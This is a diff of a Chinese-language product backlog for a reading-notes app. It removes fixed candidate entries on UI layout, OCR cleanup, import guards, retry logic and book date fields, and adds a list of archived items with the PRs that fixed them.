 **northstar:** 中——MCP 写路径是 Claude Desktop 的主要数据入口；绕过验证的状态写入可静默损坏 chatHistories，破坏 Theme 2「回顾有价值」的前提数据；数据安全边界，S 修复。
 
 ---
-
-### E104 — "↓ 最新" 滚动按钮占独立行，挤压聊天区垂直空间 [signal-backed 2026-06-16] (S)
-
-**What:** `index.html:190-192`，`chat-scroll-btn-row` div 在 HTML 结构中位于 `.chat-messages`（消息列表）和 `.chat-composer`（输入区）之间，在 CSS 中为独立 flex 行（`styles.css:2069-2073`）；桌面端通过 Grid 设为 `grid-row: 3`（`styles.css:3597-3600`），同样是独立行。按钮可见时，布局重新分配高度，消息区被压缩。
-
-```html
-<!-- index.html:190-192 -->
-<div class="chat-scroll-btn-row" id="chatScrollBtnRow" hidden>
-  <button id="chatScrollBtn" class="chat-scroll-btn" type="button" aria-label="回到最新">↓ 最新</button>
-</div>
-```
-
-```css
-/* styles.css:2069-2073 */
-.chat-scroll-btn-row {
-  display: flex;
-  justify-content: flex-end;
-  padding: 4px 4px 0;
-}
-/* styles.css:3597-3600 */
-.chat-scroll-btn-row { grid-column: 2; grid-row: 3; }
-```
-
-Signal（`signals.md:2026-06-16`）：「聊天输入框里「最新」独占一行，挤压了左侧交互内容的空间 → 希望它不占整行」。
-
-**Why:** iPhone 12 纵向空间有限，消息区每多一个独立行高就少一条可见消息。标准做法是将"回到最新"按钮用 `position: absolute; bottom: 8px; right: 12px` 叠加在消息列表容器内，`hidden` 时 zero-height，不影响其他区域布局。
-
-**Complexity:** S — 给 `.chat-messages` 容器加 `position: relative`；将 `.chat-scroll-btn-row` 改为 `position: absolute; bottom: 8px; right: 12px; z-index: 10`（移出 flex/grid 流）；删除桌面端 `grid-row: 3` 覆盖。HTML 结构移入 `.chat-messages` 内部，或保持位置不动（父容器 `position: relative` 仍可定位子元素）。
-
-**Files:** `styles.css:2069-2073`（`.chat-scroll-btn-row` 基础样式），`styles.css:3597-3600`（桌面 grid 覆盖）；`index.html:177-192`（HTML 结构参照）
-
-**northstar:** 中——Theme 1「采集顺滑」日常触点；信号明确（2026-06-16）；iPhone 12 小屏上减少垂直占用体感明显；S 修复，纯 CSS 改动。
-
----
-
-### E105 — OCR 结果填入单块 `<textarea>` 无逐行快删 UI，整页全文需手动剪辑 [signal-backed 2026-06-16] (M)
-
-**What:** 快速 OCR 完成后（Moonshot Kimi 视觉识别），`app_server.py:1347-1362` 将识别文本写入 `quote["content"]` 或 `quote["ocrText"]`，前端 `app.js:1547-1553` 将其填入 `quoteContent` textarea：
-
-```js
-// app.js:1550
-const recognizedText = quote.content || quote.ocrText || "";
-// ...然后填入 els.quoteContent.value
-```
-
-`index.html:468` 的 textarea 是单块编辑区：
-
-```html
-<textarea name="content" id="quoteContent" rows="5"
-  placeholder="可手动输入，也可以先拍照上传再尝试 OCR。"></textarea>
-```
-
-OCR 返回整页全文（500-2000 字符），用户只想保留划线句，需在 textarea 内手动定位、选中、删除多余段落。没有结构化列表视图，没有单行删除。Signal（`signals.md:2026-06-16`）：「快速 OCR 很快但会识别整页全文，只想留划线句，得手动删一大堆很麻烦 → 希望能「一行一行快速删除」OCR 结果」。
-
-**Why:** OCR 全页识别是当前架构的必然结果，用户期望"快速筛留有用行"。单块 textarea 对此使用场景严重不匹配：手机上滚动、选中、删除文本段落体验极差。逐行 chip 列表（识别结果按 `\n` 分割，每行右侧一个 ✕ 按钮）是移动端最符合拇指操作的模式；最终 ✕ 删光后合并剩余行到 textarea 值，后续保存流程不变。这是 signals.md 目前最末一条信号（2026-06-16），直接阻碍 Theme 1「采集顺滑」的验收体验。
-
-**Complexity:** M — 纯前端改动：OCR 回调处（`app.js` OCR 状态机 `ocrStatus===done` 分支）在填入 textarea 前先拆行并渲染行列表组件；行列表状态需与 textarea 值双向同步；dialog 关闭时清理行列表状态。无后端/DB schema 变化；不涉及 `sanitize_state`。M 级别主要来自 OCR 状态机（`ocrStatus` 字段转换）与新视图的正确对接，以及行列表→textarea 合并逻辑。
-
-**Files:** `app.js:1547-1553`（OCR 结果填入点）；`index.html:468`（quoteContent textarea）；`app_server.py:1347-1362`（OCR 文本来源，验证）；`styles.css`（行列表样式，新增）
-
-**northstar:** 强——signals.md 最新信号（2026-06-16）明确点名此痛点；Theme 1「采集顺滑」直接验收场景（OCR 快路径每次都触发）；快 OCR 的时间收益被后续手动清理抵消，本项修复后才能实现真正的「快路径」。
-
----
-
 
 ## 2026-06-22
 
@@ -1808,68 +1232,7 @@ book.updatedAt = new Date().toISOString();
 
 ---
 
-### E108 — 导入减量守卫未覆盖 `chatHistories`：旧备份覆盖聊天记录不弹确认 (S)
-
-**What:** `app.js:3077-3084` 的 decrease guard（OPT-043 添加）仅检查 `books`、`quotes`、`sessions`、`connections` 四类数据的数量减少，未涵盖 `chatHistories`：
-
-```js
-// app.js:3077-3084
-const _categoryLabels = { books: "书籍", quotes: "摘抄", sessions: "记录", connections: "关联" };
-const _losses = Object.entries(_categoryLabels).map(([key, label]) => {
-  const cur = Array.isArray(state[key]) ? state[key].length : 0;
-  const inc = Array.isArray(resolved[key]) ? resolved[key].length : 0;
-  return inc < cur ? `${label} ${cur - inc} 条` : null;
-}).filter(Boolean);
-```
-
-`stateContentCount()`（`app.js:3009-3016`）同样不计 `chatHistories`。而 `resolveImportState()`（`app.js:2994-3006`）**确实会**将备份中的 `chatHistories` 写入 resolved 状态。
-
-场景：用户导入一份较旧的备份文件——该备份中 books/quotes/sessions 数量相同，但当时尚未使用过聊天功能（`chatHistories: {}`）。当前账号已有 20 条探讨历史（`chatHistories` 含 20 个 key）。导入后：四类减量守卫不触发，直接调用 `applyImport()`，20 条聊天历史被静默覆盖为空。
-
-**Why:** OPT-063 已将聊天历史定性为「P1 数据安全」（compress 失败不能写入），本项是同类风险在 import 路径上的遗漏。聊天历史目前是唯一不在减量守卫内的「有价值」数据类型。S 修复：在 `_categoryLabels` 添加 `chatHistories` key，count 方式改为 `Object.keys(state.chatHistories||{}).length`。
-
-**Complexity:** S — 在 `_categoryLabels` 中增加 chatHistories 条目，并对 chatHistories 的 count 逻辑做特殊处理（Object.keys 而非 Array.isArray）。仅修改约 4 行，无后端变更。
-
-**Files:** `app.js:3009-3016`（`stateContentCount`）；`app.js:3077-3084`（decrease guard）
-
-**northstar:** 中——Theme 2「回顾有价值」以聊天历史为核心数据；import 路径的静默覆盖与 OPT-063（compress 路径丢失）构成同类「历史数据丢失」风险；本项填补数据安全护栏的最后一个口。
-
----
-
 ## 2026-06-23
-
-### E109 — `call_deepseek_stream()` 无重试逻辑：主聊天路径遇瞬断即崩 (S)
-
-**What:** `call_deepseek()` 有完整重试机制（`app_server.py:3178-3219`），但 `call_deepseek_stream()`（`app_server.py:3222-3265`）完全没有：
-
-```python
-# app_server.py:3178-3179 — 重试常量
-DEEPSEEK_MAX_ATTEMPTS = 3
-DEEPSEEK_RETRYABLE_CODES = {429, 500, 502, 503}
-
-# app_server.py:3188 — call_deepseek() 有重试循环
-for attempt in range(DEEPSEEK_MAX_ATTEMPTS):
-    ...
-
-# app_server.py:3261-3265 — call_deepseek_stream() 直接抛出，无任何重试
-except HTTPError as error:
-    payload = error.read().decode("utf-8", errors="ignore")
-    raise RuntimeError(payload or f"HTTP {error.code}") from error
-except URLError as error:
-    raise RuntimeError(str(error.reason)) from error
-```
-
-用户在聊天面板触发的 LLM 请求走的是 streaming 路径（`app_server.py:4834`: `stream = call_deepseek_stream(request_messages)`）。任何一次 429/502/503/超时都立刻报错，而非像非 streaming 路径那样静默重试 3 次。现有测试 `tests/agent/deepseek_retry_test.py` 全部针对 `call_deepseek()`，streaming 路径零测试覆盖。
-
-**Why:** 主聊天（explore/深度探讨）是 Theme 2「回顾有价值」的核心 UX；DeepSeek 429（rate limit）和 502/503（短暂不可用）在夜间/高峰期均属正常瞬断。streaming 路径无重试 = 用户看到错误弹框，而同等请求走非 streaming 路径早就静默恢复。实现对称重试技术上不复杂：streaming 的重试只需在 `urlopen()` 这一步循环，整个连接建立放入重试循环即可（不需要对 chunk 逐级重试）。
-
-**Complexity:** S — 在 `call_deepseek_stream()` 的 `urlopen()` 调用外套 `for attempt in range(DEEPSEEK_MAX_ATTEMPTS):` 循环，异常处理逻辑镜像 `call_deepseek()` 的现有模式（retryable codes + exponential backoff via `time.sleep`）。同时补一个 `tests/agent/deepseek_retry_test.py` 中的 streaming 测试 class。
-
-**Files:** `app_server.py:3222-3265`（`call_deepseek_stream`）；`tests/agent/deepseek_retry_test.py`（新增 streaming 测试）
-
-**northstar:** 强——主聊天（Theme 2 核心入口）遇瞬断即崩是对用户信任的直接伤害；修复使 streaming 路径与非 streaming 路径同等可靠，S 改动消除两路径的一致性缺口。
-
----
 
 ### E110 — MCP `_get_conn()` 缺少三项 PRAGMA 优化：写路径 SQLite 性能与 app_server 不对称 (S)
 
@@ -2113,40 +1476,6 @@ els.connectionDialog.showModal();
 
 ## 2026-06-26
 
-### E119 — 书籍 `startedAt`/`finishedAt` 字段数据已自动填充但从未在 UI 展示，与 2026-06-26 信号直接对应 (S) [signal-backed]
-
-**What:** `addBook()`（`app.js:2070-2072`）将 `startedAt`、`finishedAt`、`lastReadAt` 初始化为 `null`；`saveSession()` 新建路径（`app.js:2135-2138`）会自动更新这三个字段：
-
-```js
-// app.js:2135-2138
-book.lastReadAt = date;
-if (!book.startedAt) book.startedAt = date;
-if (book.totalPages && endPage >= book.totalPages) {
-  book.status = "finished";
-  if (!book.finishedAt) book.finishedAt = date;
-}
-```
-
-然而 `openBookDetailDialog()`（`app.js:2551-2557`）展示书籍详情时完全不读这些字段——`bookDetailMeta`（`app.js:2556`）仅显示：
-
-```js
-els.bookDetailMeta.textContent = `${book.author || "作者未填写"} · ${statusMap[book.status] || book.status || "未标记"}`;
-```
-
-`buildBookSearchCard()` 进度文案（`app.js:1123-1126`）也不含 `startedAt`/`finishedAt`；书籍新增/编辑 dialog（`index.html:386-419`）无任何日期输入字段。`formatDate()` 辅助函数（`app.js:444-451`）已就位，可直接用于格式化展示。
-
-Signal（`signals.md:2026-06-26`）：「读完《激情耗尽》想记下开始/读完日期，但现在只能手动加「记录」，经常忘 → 希望每本书有「开始阅读 / 读完」日期字段，能自动或一键标记，不依赖手动加记录」——Owner 不知道数据已通过 `saveSession()` 自动填充，只是从未被展示出来。
-
-**Why it matters:** 「开始：2026-05-01 · 读完：2026-06-26」是书单页最直观的阅读历程记录，也是 Theme 2「回顾有价值」最基础的入口。数据已在 DB 里，展示修复成本极低（2-3 行 DOM 修改）。Owner 的 signal 明确说「经常忘记手动加记录」——展示自动填充的日期可立即消除这个摩擦，无需任何新的数据采集路径。
-
-**Complexity:** S（纯展示，约 3 行改动）或 M（同时在书籍 dialog 加 date 输入字段支持手动设置，约 20-30 行）
-
-**Files:** `app.js:2551-2560`（`openBookDetailDialog`，主要展示点）；`app.js:444-451`（`formatDate`，可直接调用）；`app.js:1123-1126`（`buildBookSearchCard` 进度文案，可选）；`index.html:386-419`（书籍 dialog，可选加 date 字段）
-
-**northstar:** 强——2026-06-26 owner 最新信号直接点名；数据已存在只需展示；完成后书单页真正成为阅读历程视图，直接支撑「不假思索的默认工具」核心体感。→ **promoted to OPT-074**
-
----
-
 ### E120 — 自定义摘抄标签仅存 `localStorage`，跨设备不同步，备份导出中不存在 (M)
 
 **What:** `getCustomQuoteTags()` 和 `saveCustomQuoteTags()`（`app.js:460-464`）将用户自定义摘抄标签完全存储在浏览器 localStorage 中：
@@ -2224,38 +1553,6 @@ const allSorted = (state.sessions || []).slice().sort(
 
 ## 2026-06-27
 
-### E123 — `saveBookEdit()` 手动将状态设为「已读完」时不自动写入 `finishedAt`，OPT-074 上线后将出现日期展示空洞 (S)
-
-**What:** `saveBookEdit()`（`app.js:2486-2501`）在用户通过下拉框选择「已读完」时，`finishedAt` 的写入被一个 `totalPages` 条件块守卫：
-
-```js
-// app.js:2490-2501
-if (book.status === "reading" || book.status === "finished") {
-    book.lastReadAt = new Date().toISOString();
-    if (!book.startedAt) {
-      book.startedAt = book.lastReadAt;   // startedAt 正确写入 ✓
-    }
-}
-if (book.totalPages && currentPage >= book.totalPages) {   // ← 只有 totalPages 存在时
-    book.status = "finished";
-    if (!book.finishedAt) {
-      book.finishedAt = new Date().toISOString();            // ← 此块才写 finishedAt
-    }
-}
-```
-
-当用户手动选「已读完」但未填写 `totalPages` 时：`startedAt` 和 `lastReadAt` 均被正确写入，但 `finishedAt` 永远是 `null`。这与通过 `saveSession()` 路径（`app.js:2137-2138`）触发的 `finishedAt` 写入行为不一致——后者同样依赖 `totalPages && endPage >= totalPages`，因此「直接在下拉框选完」的路径完全没有 `finishedAt` 的写入时机。
-
-**Why it matters:** OPT-074（PR #53, in-progress）正在给书籍详情页增加 `startedAt`/`finishedAt` 展示。OPT-074 上线后，手动标记「已读完」的书将显示「开始：YYYY-MM-DD · 读完：未记录」——数据状态（finished）与展示状态（无 finishedAt）不一致，直接让 OPT-074 的产品价值打折。修复只需在 `saveBookEdit()` 补一行：`if (book.status === "finished" && !book.finishedAt) { book.finishedAt = book.lastReadAt; }`。
-
-**Complexity:** S — `app.js` 单处改动，约 1 行，无后端/DB 变更，无测试基础设施变更（现有 `book-detail-ux.test.js` 可加回归用例）。
-
-**Files:** `app.js:2490-2501`（`saveBookEdit` 状态写入块）；`app.js:2135-2138`（`saveSession` 路径对比参考）
-
-**northstar:** 强——E123 是 OPT-074（书籍日期展示）的数据完整性前提；「读完日期」是北极星「不假思索的默认工具」最直观的成就感触点，显示「未记录」直接伤害体感。→ **promoted to OPT-075**
-
----
-
 ### E124 — `renderTimeline()` 硬上限 10 条，无分页/「加载更多」，阅读历史超 10 次后全部不可见 (M)
 
 **What:** `renderTimeline()`（`app.js:1321-1399`）在无搜索词时将结果截断为 10 条：
@@ -2276,35 +1573,6 @@ const sessions = searchRaw
 **Files:** `app.js:1329-1337`（sessions 计算与截断）；`app.js:1351-1399`（DOM 渲染循环）
 
 **northstar:** 中——Theme 2「回顾有价值」要求完整历史可访问；当前上限在 2-3 个月真实使用后触发，属 Theme 2 验收前的前置修复。
-
----
-
-### E125 — 书籍编辑对话框无 `startedAt`/`finishedAt` 日期输入字段，用户无法手动修正自动填充的日期 (S/M)
-
-**What:** `index.html:332-358` 的书籍编辑 dialog（`bookEditDialog`）包含 `currentPage`（number）、`status`（select）、`notes`（textarea）三个字段，无任何日期输入：
-
-```html
-<!-- index.html:344-352 — 完整字段列表 -->
-<label><span>当前页码</span><input name="currentPage" type="number" min="0" required /></label>
-<label><span>状态</span>
-  <select name="status" class="compact-status-select">
-    <option value="reading">阅读中</option>
-    <option value="wishlist">想读</option>
-    <option value="finished">已读完</option>
-  </select>
-</label>
-<label><span>内容简介 / 备注</span><textarea name="notes" ...></textarea></label>
-```
-
-`saveBookEdit()`（`app.js:2455-2501`）不读取任何日期字段。`startedAt`/`finishedAt` 由 `saveSession()` 和 `saveBookEdit()` 自动填充（不完整，见 E123），但用户无法覆盖自动值——例如「书是去年买的，今年 3 月开始读」「上周读完但忘了记 session」等常见场景下，日期只能是 `null` 或自动填充时的错误时间。
-
-**Why it matters:** OPT-074 上线后日期将在书籍详情页显示。自动填充路径覆盖约 60% 的场景（有 session 记录时），但「读了书但忘记记录 session」「用 Excel 批量导入的历史书单」等场景下日期均为 `null`，用户期望的「输入框里手动填」的交互不存在。OPT-074 设计中已提到「可选升级（M）」，本条将其显式化为独立 backlog 候选。
-
-**Complexity:** S（仅展示不可编辑的日期，在 `bookDetailMeta` 同时显示，OPT-074 范围内）；M（`bookEditDialog` 增加两个 `type="date"` 输入 + `saveBookEdit()` 读取并写入）。S 版已由 OPT-074 覆盖；**独立价值**在 M 版（编辑 dialog 的输入字段），需在 OPT-074 合并后评估是否跟进。
-
-**Files:** `index.html:332-358`（`bookEditDialog` 字段列表）；`app.js:2455-2501`（`saveBookEdit` 字段读取与写入）
-
-**northstar:** 中——「想记一下开始/读完日期，但无法手动输入」与 2026-06-26 信号直接对应；是 OPT-074 日期展示功能的交互闭环（展示 ≠ 可编辑）；Theme 2「回顾有价值」以准确的阅读历程数据为前提。
 
 ---
 
@@ -3068,3 +2336,52 @@ function matchBooks(query) {
 ---
 
 > 本次 run 将 E148（pagesRead 差一）提拔为 OPT-094，E155（摘抄页码预填）提拔为 OPT-095。E151（跨页 OCR）、E152（书籍阅读日期字段）、E156（导出时间戳 UTC 一致性）、E157（摘抄来源过滤）作为候选登记。
+
+## 已归档
+
+> 2026-07-06 月度 prune(roadmap §5 规则3)。归档标准:问题已被已合并 PR 修掉,或已列 ⛔ 排除表。
+> 年龄标准(>90天未提拔)本次命中 0 条——蓄水池最早条目仅 2026-05-30。保守起见,未修的重复条目一律留在活跃区。
+
+- E1 — Global search ignores the quotes tab entirely (S) — 归档:已列 backlog ⛔ 排除表(全局搜索含摘抄=设计决策,永不提拔)
+- E2 — `imghdr` is deprecated and removed in Python 3.13 (S) — 归档:已修 OPT-007 (PR#10)
+- E3 — Static JS/CSS served with `no-store`; ETag/304 would eliminate repeat downloads (S) — 归档:已修 OPT-086 (静态资源 immutable 缓存)
+- E8 — `json.loads()` in `summarize_metrics()` has no error handling — one corrupted row crashes the whole metrics endpoint (S) — 归档:已修 OPT-008 (PR#11)
+- E9 — `_read_json()` reads the full request body with no size cap — DoS via oversized payload (M) — 归档:已修 OPT-009 (PR#12)
+- E10 — Export exists but there is no import endpoint — backups are unrestorable (M) — 归档:已修 OPT-040 (导入端点/护栏, PR#36)
+- E11 — Four GC functions defined but never called — DB grows forever (S) — 归档:已修 OPT-010 (PR#13)
+- E12 — HTML responses served with no security headers (S) — 归档:已修 OPT-011 (PR#20)
+- E16 — `call_deepseek()` has zero retry logic; transient 429/502 silently fails three critical paths (S) — 归档:已修 OPT-012 (PR#18)
+- E17 — Buttons have no `:focus-visible` style — keyboard users get zero focus indicator (S) — 归档:已修 OPT-013 (PR#23)
+- E21 — App ships with no `prefers-color-scheme: dark` support; reading at night forces bright white screen (M) — 归档:已修 OPT-021 (PR#21)
+- E22 — `model_logs` and `agent_traces` have no `user_id` index — debug dashboard does full table scans (S) — 归档:已修 OPT-017 (PR#19)
+- E24 — Streaming chat fetch has no AbortController timeout — server hang or silent network drop freezes the UI indefinitely (M) — ✅ DONE (commit c5c4281) — 归档:已修 (commit c5c4281, 条目自标 DONE)
+- E25 — CSS transitions and infinite animation lack `prefers-reduced-motion` guard — WCAG Level A violation (S) — 归档:已修 OPT-018 (PR#23)
+- E26 — Handler methods acquire `conn` but close it manually without `try/finally` — exceptions after `_require_user()` leak the connection (M) — 归档:已修 OPT-039 (PR#35, _open_conn 安全网)
+- E28 — Toast notification lacks `aria-live` — screen reader users never hear transient feedback (S) — 归档:已修 OPT-019 (PR#23)
+- E29 — `PromptBuilder` injects `existing_connections[:20]` into every chat request — irrelevant for 80%+ of chats (S) — 归档:已修 OPT-020 (PR#22)
+- E31 — Auth endpoints have no rate limiting — credential stuffing and spam registration undefended (M) — 归档:已修 OPT-022 (PR#28)
+- E32 — `/media/` serves user images unauthenticated with wildcard CORS — any site can hotlink private photos (S) — 归档:已修 OPT-023 (PR#24)
+- E35 — `syncState()` has no optimistic locking — concurrent tabs or devices silently overwrite each other (M) — 归档:已修 OPT-030 (PR#29)
+- E36 — `ActionExecutor` uses `datetime.now().isoformat()` — agent-created records carry naïve local time + microseconds (same timezone bug as OPT-014, unfixed path) (S) — 归档:已修 OPT-024 (PR#25)
+- E37 — `agent_trace_events` table has no index on `trace_id` — trace detail fetch is a full table scan (S) — 归档:已修 OPT-025 (PR#30)
+- E41 — `/debug/*` endpoints are world-readable when `ADMIN_TOKEN` is unset — all users' AI chat content exposed (S) — 归档:已修 OPT-028 (PR#26)
+- E42 — `execute_action()` reads and writes state non-atomically — concurrent approvals from two browser tabs silently discard mutations (M) — 归档:已修 OPT-029 (PR#27/#29)
+- E47 — `reading_mcp_server.py` uses `datetime.now().isoformat()` — same naïve-local-time bug as OPT-024, unpatched path (S) — 归档:已修 OPT-031 (PR#32)
+- E50 — `<dialog>` elements have no `aria-labelledby` — screen readers announce modals with no name (WCAG 4.1.2 Level A) (S) — 归档:已修 OPT-033 (PR#34)
+- E52 — Debug dashboard injects user content unescaped into HTML — stored XSS via chat messages (S) — 归档:已修 OPT-034 (PR#33)
+- E61 — `compareBooksForList()` secondary sort still uses `localeCompare` — `renderQuotes()` was defensively fixed by OPT-014 but `renderBooks()` was not (S) — 归档:已修 OPT-037 (PR#42)
+- E68 — Session CRUD and Connection CRUD have no frontend JS tests — two of the four main tabs are regression-blind (M) — 归档:已修 OPT-045 (PR#43)
+- E74 — `PromptBuilder.all_books_summary` injected without count limit — 500-book users pay ~8,000 extra tokens per chat request (S) — 归档:已修 OPT-047 (PR#45)
+- E86 — 摘抄卡面从不显示图片缩略图——拍照 OCR 后卡面无视觉区分度 (S) — 归档:已修 OPT-052 (PR#48)
+- E87 — 「↓ 最新」按钮独占一个布局行压缩消息区——改为叠加在消息列表上的浮动按钮 (S) — 归档:已修 OPT-054 (PR#47)
+- E88 — 快速 OCR 填入整页全文后无行级删除 UI，用户须手动选删大段内容 (M) — 归档:已修 OPT-055 (PR#46)
+- E94 — Session 新建表单日期预填 UTC 日期，UTC+8 凌晨用户（00:00–08:00）看到昨天日期 (S) — 归档:已修 OPT-059 (PR#54)
+- E100 — `showConfirmDialog()` 与 `deleteBook()` 均未处理 Escape 关闭，残留 `{ once: true }` 监听器可触发错误删除 (S) — 归档:已修 OPT-062 (PR#49)
+- E102 — `compress_chat_history_if_needed()` API 失败时静默写入截断历史，永久丢失旧消息 (S) — 归档:已修 OPT-063 (PR#49)
+- E104 — "↓ 最新" 滚动按钮占独立行，挤压聊天区垂直空间 [signal-backed 2026-06-16] (S) — 归档:已修 OPT-054 (PR#47, 与E87同)
+- E105 — OCR 结果填入单块 `<textarea>` 无逐行快删 UI，整页全文需手动剪辑 [signal-backed 2026-06-16] (M) — 归档:已修 OPT-055 (PR#46, 与E88同)
+- E108 — 导入减量守卫未覆盖 `chatHistories`：旧备份覆盖聊天记录不弹确认 (S) — 归档:已修 OPT-068 (PR#51)
+- E109 — `call_deepseek_stream()` 无重试逻辑：主聊天路径遇瞬断即崩 (S) — 归档:已修 OPT-069 (PR#50)
+- E119 — 书籍 `startedAt`/`finishedAt` 字段数据已自动填充但从未在 UI 展示，与 2026-06-26 信号直接对应 (S) [signal-backed] — 归档:已修 OPT-074 (PR#53)
+- E123 — `saveBookEdit()` 手动将状态设为「已读完」时不自动写入 `finishedAt`，OPT-074 上线后将出现日期展示空洞 (S) — 归档:已修 OPT-074/075 (PR#53)
+- E125 — 书籍编辑对话框无 `startedAt`/`finishedAt` 日期输入字段，用户无法手动修正自动填充的日期 (S/M) — 归档:已修 OPT-074 (PR#53, 含编辑日期字段)
